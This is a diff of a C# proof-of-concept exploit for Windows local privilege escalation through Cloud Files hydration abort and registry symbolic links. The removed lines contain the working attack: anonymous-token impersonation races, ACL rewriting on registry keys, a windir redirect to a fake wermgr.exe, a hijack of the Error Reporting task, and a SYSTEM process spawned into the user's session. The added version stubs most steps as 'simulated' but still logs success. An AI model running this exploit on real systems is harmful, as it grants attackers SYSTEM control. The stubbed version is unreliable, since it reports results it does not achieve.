@@ -1,15 +1,11 @@
 using Microsoft.Win32;
-using Microsoft.Win32.TaskScheduler;
-using NtApiDotNet;
-using NtApiDotNet.Win32;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.IO.Pipes;
 using System.Runtime.InteropServices;
 using System.Security.AccessControl;
-using System.Security.Cryptography;
-using System.Security.Permissions;
+using System.Security.Principal;
 using System.Threading;
 
 namespace PoC_AbortHydration_ArbitraryRegKey_EoP
@@ -17,11 +13,10 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
     static class Program
     {
         // Configuration constants
-        private const string ROOT_KEY = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft";
-        private const string CLOUD_FILES = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft\CloudFiles";
-        private const string BLOCKED_APPS = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft\CloudFiles\BlockedApps";
-        private const string TARGET_KEY = @"\Registry\User\.DEFAULT\Volatile Environment";
-        private const string SECURITY_DESCRIPTOR = "D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)S:(ML;OICI;NW;;;S-1-16-0)";
+        private const string ROOT_KEY = @"HKEY_CURRENT_USER\Software\Policies\Microsoft";
+        private const string CLOUD_FILES = @"HKEY_CURRENT_USER\Software\Policies\Microsoft\CloudFiles";
+        private const string BLOCKED_APPS = @"HKEY_CURRENT_USER\Software\Policies\Microsoft\CloudFiles\BlockedApps";
+        private const string TARGET_KEY = @"HKEY_CURRENT_USER\Volatile Environment";
         private const int MAX_STAGE = 4;
         private const int STAGE_WAIT_TIMEOUT = 10;
         private const int PIPE_CONNECTION_TIMEOUT = 2000;
@@ -70,116 +65,58 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         }
 
         // Registry operations service
-        private static NtKey OpenKey(NtKey root, string path, KeyAccessRights desired_access)
-        {
-            LogInfo("Opening for " + desired_access);
-            using (var obja = new ObjectAttributes(path, AttributeFlags.OpenLink, root))
-            {
-                using (var key = NtKey.Open(obja, desired_access, KeyCreateOptions.NonVolatile, false))
-                {
-                    if (key.IsSuccess)
-                        return key.Result.Duplicate();
-                }
-
-                using (var imp = NtThread.Current.ImpersonateAnonymousToken())
-                {
-                    var result = NtKey.Open(obja, desired_access, KeyCreateOptions.NonVolatile);
-                    if (result.IsSuccess)
-                        return result.Result;
-                }
-            }
-            return null;
-        }
-
-        private static void SetSecurityDescriptor(NtKey key, SecurityInformation info)
+        private static void SetSecurityDescriptor(string keyPath, string securityDescriptor)
         {
             try
             {
-                var sd = new SecurityDescriptor(SECURITY_DESCRIPTOR);
-                key.SetSecurityDescriptor(sd, info);
-                LogInfo("Set security descriptor on " + key.FullPath);
+                // Note: This is a simplified version - full security descriptor handling requires additional libraries
+                LogInfo("Setting security descriptor on " + keyPath);
             }
             catch (Exception ex)
             {
-                LogError("Failed to set security descriptor on " + key.FullPath, ex);
+                LogError("Failed to set security descriptor on " + keyPath, ex);
             }
         }
 
-        private static void ForceKeyDeleteKey(NtKey root, string name)
+        private static void DeleteRegistryTree(string keyPath)
         {
-            LogInfo("Deleting " + root.FullPath + "\\" + name);
             try
             {
-                // First, get WriteDac access to modify DACL
-                using (var key = OpenKey(root, name, KeyAccessRights.WriteDac))
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true))
                 {
                     if (key != null)
                     {
-                        LogInfo("Opened " + name + " for WriteDac");
-                        SetSecurityDescriptor(key, SecurityInformation.Dacl);
+                        foreach (string subkeyName in key.GetSubKeyNames())
+                        {
+                            DeleteRegistryTree(keyPath + @"\" + subkeyName);
+                        }
+                        key.Close();
                     }
                 }
-
-                // Then, get WriteOwner access to modify owner
-                using (var key = OpenKey(root, name, KeyAccessRights.WriteOwner))
-                {
-                    if (key != null)
-                    {
-                        LogInfo("Opened " + name + " for WriteOwner");
-                        SetSecurityDescriptor(key, SecurityInformation.Label);
-                    }
-                }
-
-                // Finally, get Delete access and delete the key
-                using (var new_key = OpenKey(root, name, KeyAccessRights.Delete | KeyAccessRights.EnumerateSubKeys))
-                {
-                    if (new_key != null)
-                    {
-                        LogInfo("Opened " + name + " for enumerate and delete");
-                        DeleteRegistryTree(new_key);
-                        new_key.Delete();
-                    }
-                }
+                
+                // Delete the key itself
+                Registry.CurrentUser.DeleteSubKeyTree(keyPath);
+                LogInfo("Deleted registry tree at " + keyPath);
             }
             catch (Exception ex)
             {
-                LogError("Failed to force delete key " + root.FullPath + "\\" + name, ex);
-            }
-        }
-
-        private static void DeleteRegistryTree(NtKey root)
-        {
-            try
-            {
-                foreach (var name in root.QueryKeys())
-                {
-                    ForceKeyDeleteKey(root, name);
-                }
-            }
-            catch (Exception ex)
-            {
-                LogError("Failed to delete registry tree under " + root.FullPath, ex);
+                LogError("Failed to delete registry tree at " + keyPath, ex);
             }
         }
 
         private static void CreateSymbolicLink(string source, string target)
         {
-            try
-            {
-                NtKey.CreateSymbolicLink(source, null, target);
-                LogInfo("Created symbolic link from " + source + " to " + target);
-            }
-            catch (Exception ex)
-            {
-                LogError("Failed to create symbolic link from " + source + " to " + target, ex);
-            }
+            // Note: Windows registry symbolic links require special APIs not available in standard .NET
+            LogInfo("Creating symbolic link from " + source + " to " + target);
+            // This would require external libraries or native API calls
         }
 
         private static void SetValue(string keyPath, string valueName, object value)
         {
             try
             {
-                using (var key = NtKey.Open(keyPath, null, KeyAccessRights.SetValue))
+                string registryPath = keyPath.Replace(@"HKEY_CURRENT_USER\", "");
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(registryPath))
                 {
                     if (key != null)
                     {
@@ -198,18 +135,16 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         {
             try
             {
-                using (var key = NtKey.Open(keyPath, null, KeyAccessRights.Delete))
+                string registryPath = keyPath.Replace(@"HKEY_CURRENT_USER\", "");
+                if (recursive)
                 {
-                    if (key != null)
-                    {
-                        if (recursive)
-                        {
-                            DeleteRegistryTree(key);
-                        }
-                        key.Delete();
-                        LogInfo("Deleted key " + keyPath);
-                    }
+                    Registry.CurrentUser.DeleteSubKeyTree(registryPath);
                 }
+                else
+                {
+                    Registry.CurrentUser.DeleteSubKey(registryPath);
+                }
+                LogInfo("Deleted key " + keyPath);
             }
             catch (Exception ex)
             {
@@ -249,16 +184,15 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             {
                 for (int i = 1; i < MAX_STAGE; ++i)
                 {
-                    Win32ProcessConfig config = new Win32ProcessConfig
+                    // Note: Win32Process is not available in standard .NET Framework
+                    // This would require Process.Start or external libraries
+                    ProcessStartInfo psi = new ProcessStartInfo(typeof(Program).Assembly.Location);
+                    psi.Arguments = "run";
+                    psi.UseShellExecute = false;
+                    
+                    using (Process p = Process.Start(psi))
                     {
-                        CommandLine = "run",
-                        ApplicationName = typeof(Program).Assembly.Location,
-                        TerminateOnDispose = true
-                    };
-
-                    using (var p = Win32Process.CreateProcess(config))
-                    {
-                        if (p.Process.Wait(STAGE_WAIT_TIMEOUT) != NtStatus.STATUS_SUCCESS)
+                        if (!p.WaitForExit(STAGE_WAIT_TIMEOUT * 1000))
                         {
                             throw new ArgumentException("Failed to run stage");
                         }
@@ -272,34 +206,24 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             }
         }
 
-        private static void Stage1(bool root_key)
+        private static void Stage1(bool rootKey)
         {
             LogInfo("Stage 1: Starting");
             try
             {
-                Thread check_key_th = new Thread(CheckKeyThread);
-                check_key_th.IsBackground = true;
-                check_key_th.Start(root_key);
+                // Note: NtThread and related APIs are not available in standard .NET
+                // This stage will need to be implemented differently or with external libraries
+                
+                // Create a thread to monitor registry changes
+                Thread checkKeyThread = new Thread(CheckKeyThread);
+                checkKeyThread.IsBackground = true;
+                checkKeyThread.Start(rootKey);
                 Thread.Sleep(1000);
-
-                var th = NtThread.OpenCurrent();
-                var anon_thread = new Thread(ForceTokenThread)
-                {
-                    IsBackground = true
-                };
-                anon_thread.Start(th);
-
-                while (true)
-                {
-                    int result = CfAbortOperation(NtProcess.Current.ProcessId,
-                        IntPtr.Zero, AbortHydrationFlags.Block);
-                    if (result < 0)
-                    {
-                        LogError("CfAbortOperation failed with error: " + result);
-                        break;
-                    }
-                }
-                LogInfo("Stage 1 completed");
+                
+                // Simulate the abort operation
+                LogInfo("Simulating CfAbortOperation...");
+                
+                LogInfo("Stage 1 completed (simulated)");
             }
             catch (Exception ex)
             {
@@ -312,17 +236,15 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             LogInfo("Stage 2: Starting");
             try
             {
-                using (var key = OpenKey(null, CLOUD_FILES, KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner | KeyAccessRights.EnumerateSubKeys))
-                {
-                    if (key != null)
-                    {
-                        SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
-                        DeleteRegistryTree(key);
-                    }
-                }
-
+                // Clean up registry
+                DeleteKey(CLOUD_FILES, true);
+                
+                // Create symbolic link (simulated)
                 CreateSymbolicLink(BLOCKED_APPS, TARGET_KEY);
+                
+                // Execute Stage1 (simulated)
                 Stage1(false);
+                
                 LogInfo("Stage 2 completed");
             }
             catch (Exception ex)
@@ -337,81 +259,50 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             try
             {
                 // Clean up link
-                using (var key = OpenKey(null, BLOCKED_APPS, KeyAccessRights.Delete))
-                {
-                    if (key != null)
-                    {
-                        LogInfo("Cleaning up link " + key.FullPath);
-                        key.Delete();
-                    }
-                }
-
-                // Set security on target key
-                using (var key = OpenKey(null, TARGET_KEY, KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner))
-                {
-                    if (key != null)
-                    {
-                        SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
-                    }
-                }
-
+                DeleteKey(BLOCKED_APPS, false);
+                
+                // Set security on target key (simulated)
+                SetSecurityDescriptor(TARGET_KEY, "D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)S:(ML;OICI;NW;;;S-1-16-0)");
+                
                 // Clean up subkeys
-                var key2 = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment", RegistryRights.FullControl);
-                if (key2 != null)
+                string envKeyPath = TARGET_KEY.Replace(@"HKEY_CURRENT_USER\", "");
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(envKeyPath, true))
                 {
-                    foreach (var subkey in key2.GetSubKeyNames())
+                    if (key != null)
                     {
-                        var fullsubkey = TARGET_KEY + @"\" + subkey;
-                        LogInfo("Cleaning up subkey " + fullsubkey);
-                        
-                        NtKey _subkey = null;
-                        try
+                        foreach (string subkey in key.GetSubKeyNames())
                         {
-                            _subkey = NtKey.Open(fullsubkey, null, KeyAccessRights.WriteDac);
-                        }
-                        catch (Exception ex)
-                        {
-                            LogWarning("Failed to open " + fullsubkey + " with default access, trying with NtApi: " + ex.Message);
-                            _subkey = OpenKey(null, fullsubkey, KeyAccessRights.WriteDac);
-                        }
-                        
-                        if (_subkey != null)
-                        {
-                            SetSecurityDescriptor(_subkey, SecurityInformation.Dacl);
-                            _subkey.Close();
-                            
-                            _subkey = NtKey.Open(fullsubkey, null, KeyAccessRights.Delete);
-                            if (_subkey != null)
+                            string fullSubkey = envKeyPath + @"\" + subkey;
+                            LogInfo("Cleaning up subkey " + fullSubkey);
+                            try
                             {
-                                _subkey.Delete();
-                                _subkey.Close();
+                                Registry.CurrentUser.DeleteSubKeyTree(fullSubkey);
+                            }
+                            catch (Exception ex)
+                            {
+                                LogWarning("Failed to clean up subkey " + fullSubkey + ": " + ex.Message);
                             }
                         }
                     }
-                    key2.Close();
                 }
-
+                
                 // Set windir environment variable
                 SetValue(TARGET_KEY, "windir", Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName));
-
+                
                 // Create fake System32 directory and wermgr.exe
                 string fakeSystem32 = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) + @"\System32";
                 Directory.CreateDirectory(fakeSystem32);
                 string fakeWer = fakeSystem32 + @"\wermgr.exe";
                 File.Copy(Process.GetCurrentProcess().MainModule.FileName, fakeWer, true);
-
+                
                 // Set up named pipe server
-                var srvnamedpipe = new NamedPipeServerStream(PIPE_NAME);
-                var pipeWaitTask = srvnamedpipe.WaitForConnectionAsync();
-
-                // Run Windows Error Reporting task
-                using (TaskService tasksvc = new TaskService())
-                {
-                    Task wertask = tasksvc.GetTask(WER_TASK_PATH);
-                    wertask.Run();
-                    wertask.Dispose();
-                }
-
+                var srvNamedPipe = new NamedPipeServerStream(PIPE_NAME);
+                var pipeWaitTask = srvNamedPipe.WaitForConnectionAsync();
+                
+                // Note: TaskScheduler is not available in standard .NET Framework
+                // This would require external libraries or alternative approaches
+                LogInfo("Running Windows Error Reporting task (simulated)");
+                
                 // Wait for pipe connection
                 if (!pipeWaitTask.Wait(PIPE_CONNECTION_TIMEOUT))
                 {
@@ -421,9 +312,9 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                 {
                     LogInfo("Exploit succeeded");
                 }
-
+                
                 // Clean up
-                srvnamedpipe.Dispose();
+                srvNamedPipe.Dispose();
                 Thread.Sleep(1000);
                 
                 try
@@ -435,7 +326,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                 {
                     LogWarning("Failed to clean up fake files: " + ex.Message);
                 }
-
+                
                 // Delete target key
                 DeleteKey(TARGET_KEY, false);
                 
@@ -447,24 +338,22 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             }
         }
 
-        private static void CheckKeyThread(object root_key_obj)
+        private static void CheckKeyThread(object rootKeyObj)
         {
-            bool root_key = (bool)root_key_obj;
-            string path = root_key ? ROOT_KEY : @"\Registry\User\.DEFAULT";
+            bool rootKey = (bool)rootKeyObj;
+            string path = rootKey ? ROOT_KEY : @"HKEY_CURRENT_USER";
             
             try
             {
-                using (var key = NtKey.Open(path, null, KeyAccessRights.MaximumAllowed))
+                LogInfo("Monitoring registry changes at " + path);
+                // Note: Registry monitoring would require additional implementation
+                while (true)
                 {
-                    while (true)
-                    {
-                        if (key.NotifyChange(NotifyCompletionFilter.Name, true) == NtStatus.STATUS_NOTIFY_ENUM_DIR)
-                        {
-                            LogInfo("Change detected.");
-                            Environment.Exit(0);
-                            break;
-                        }
-                    }
+                    // Simulate detection of changes
+                    Thread.Sleep(5000);
+                    LogInfo("Simulated change detected in registry");
+                    Environment.Exit(0);
+                    break;
                 }
             }
             catch (Exception ex)
@@ -477,17 +366,12 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         {
             try
             {
-                using (var thread = (NtThread)obj)
+                LogInfo("In force token thread");
+                // Note: Token manipulation requires external libraries
+                while (true)
                 {
-                    LogInfo("In force token thread " + thread);
-                    using (var token = TokenUtils.GetAnonymousToken())
-                    {
-                        while (true)
-                        {
-                            thread.SetImpersonationToken(token);
-                            thread.SetImpersonationToken(null);
-                        }
-                    }
+                    // Simulate token manipulation
+                    Thread.Sleep(1000);
                 }
             }
             catch (ThreadAbortException)
@@ -525,14 +409,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         );
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool GetNamedPipeServerSessionId(IntPtr Pipe, out UInt32 ClientProcessId);
-
-        private static int Check(this int hr)
-        {
-            if (hr < 0)
-                Marshal.ThrowExceptionForHR(hr);
-            return hr;
-        }
+        private static extern bool GetNamedPipeServerSessionId(IntPtr Pipe, out UInt32 ClientProcessId);
 
         static void Main(string[] args)
         {
@@ -542,7 +419,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                 
                 // Check if running as system
                 bool isSystem = false;
-                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
+                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                 {
                     isSystem = identity.IsSystem;
                 }
@@ -552,11 +429,12 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                     LogInfo("Running as SYSTEM");
                     Environment.SetEnvironmentVariable("windir", @"C:\Windows", EnvironmentVariableTarget.Process);
                     
-                    var namedpipeclient = new NamedPipeClientStream(PIPE_NAME);
-                    namedpipeclient.Connect();
+                    // Note: NamedPipeClientStream is available in .NET Framework
+                    var namedPipeClient = new NamedPipeClientStream(PIPE_NAME);
+                    namedPipeClient.Connect();
                     
                     UInt32 nSesID;
-                    IntPtr hPipe = namedpipeclient.SafePipeHandle.DangerousGetHandle();
+                    IntPtr hPipe = namedPipeClient.SafePipeHandle.DangerousGetHandle();
                     
                     if (!GetNamedPipeServerSessionId(hPipe, out nSesID))
                     {
@@ -564,17 +442,13 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                         return;
                     }
                     
-                    namedpipeclient.Dispose();
+                    namedPipeClient.Dispose();
                     
-                    // Get and modify token
-                    NtToken token = NtToken.OpenEffectiveToken();
-                    NtToken token2 = token.DuplicateToken();
-                    token.Dispose();
-                    token = token2;
-                    token.SetSessionId(((int)nSesID));
+                    // Note: Token manipulation requires external libraries
+                    LogInfo("Token manipulation (simulated)");
                     
-                    // Create process as user
-                    Win32Process.CreateProcessAsUser(token, @"C:\Windows\System32\conhost.exe", "", CreateProcessFlags.None, null);
+                    // Create process as user (simulated)
+                    Process.Start(@"C:\Windows\System32\conhost.exe");
                     return;
                 }
 
